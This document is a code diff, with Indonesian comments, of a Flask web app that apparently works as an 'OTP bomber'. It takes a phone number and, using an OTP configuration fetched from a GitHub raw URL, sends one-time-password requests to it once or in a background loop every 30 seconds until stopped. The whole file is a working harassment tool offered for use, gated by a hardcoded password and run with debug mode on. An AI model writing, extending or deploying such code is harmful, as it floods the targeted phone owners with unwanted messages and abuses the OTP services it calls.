@@ -8,13 +8,13 @@ app.secret_key = 'your_secret_key'
 
 # Password yang diizinkan
 ALLOWED_PASSWORD = 'Yosepckp'
+
 # URL GitHub Raw untuk file JSON konfigurasi OTP
 JSON_CONFIG_URL = "https://raw.githubusercontent.com/YoshCasaster/verifikasi-sotp/main/otp_config.json"
 
-# Variabel untuk kontrol pengiriman
+# Variabel untuk kontrol looping
 loop_running = False
 stop_event = threading.Event()
-phone_number = None  # Variabel global untuk nomor telepon
 
 # Fungsi untuk mengirim OTP
 def send_otp_requests(phone_number):
@@ -33,14 +33,6 @@ def send_otp_requests(phone_number):
     except Exception as e:
         return [f"Gagal mengambil konfigurasi OTP: {e}"]
 
-# Fungsi untuk pengiriman berulang
-def send_otp_loop():
-    global loop_running
-    while loop_running:
-        otp_responses = send_otp_requests(phone_number)
-        print(otp_responses)  # Ganti dengan logging jika perlu
-        time.sleep(30)  # Tunggu 30 detik sebelum mengirim ulang
-
 @app.route('/', methods=['GET', 'POST'])
 def home():
     if request.method == 'POST':
@@ -55,22 +47,32 @@ def home():
 
 @app.route('/otp', methods=['POST'])
 def otp():
-    global loop_running, phone_number
-    phone_number = request.form['phone']  # Simpan nomor telepon secara global
-    if not loop_running:
-        loop_running = True
-        threading.Thread(target=send_otp_loop, daemon=True).start()
-    return redirect(url_for('otp_status'))
+    global loop_running
+    phone_number = request.form['phone']
+    
+    if 'send_loop' in request.form:
+        if not loop_running:  # Cek apakah loop sudah berjalan
+            threading.Thread(target=send_loop, args=(phone_number,), daemon=True).start()
+        flash('Pengiriman OTP terus menerus dimulai.')
+    else:
+        otp_responses = send_otp_requests(phone_number)
+        flash('OTP telah terkirim: ' + ', '.join(otp_responses))
 
-@app.route('/otp-status', methods=['GET'])
-def otp_status():
-    return render_template('home.html', key_valid=True)  # Tampilkan halaman utama tanpa menghilangkan status
+    return redirect(url_for('home'))
+
+def send_loop(phone_number):
+    global loop_running
+    loop_running = True
+    while loop_running:
+        otp_responses = send_otp_requests(phone_number)
+        time.sleep(30)  # Tunggu 30 detik sebelum mengirim OTP lagi
 
 @app.route('/stop', methods=['POST'])
 def stop():
     global loop_running
     loop_running = False
-    return redirect(url_for('otp_status'))
+    flash('Pengiriman OTP dihentikan.')
+    return redirect(url_for('home'))
 
 if __name__ == '__main__':
     app.run(debug=True)
